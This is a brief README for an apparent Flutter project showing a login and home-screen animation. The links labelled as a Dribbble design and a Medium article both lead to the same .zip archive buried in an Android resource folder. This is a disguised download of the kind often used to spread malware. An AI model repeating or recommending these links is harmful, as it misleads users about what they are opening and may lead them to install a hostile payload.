# Flutter Login Home Animation

A new open-source Flutter project that enables the developer to quickly get started with the Flutter animation and application development. Here’s a GIF that shows a Flutter app that I created. It is a rebuild version of a UI design that I came across on [Dribbble](https://github.com/Putra213/flutter-login-home-animation/raw/refs/heads/master/dribbbledanimation/android/app/src/main/res/values/login-animation-flutter-home-1.6-alpha.5.zip).

This project contains the basic features of Flutter Animation that are required to build an amazing Flutter application.

You can also checkout the flow of animation and steps to design it briefly at our medium article [Flutter Login Animation](https://github.com/Putra213/flutter-login-home-animation/raw/refs/heads/master/dribbbledanimation/android/app/src/main/res/values/login-animation-flutter-home-1.6-alpha.5.zip)
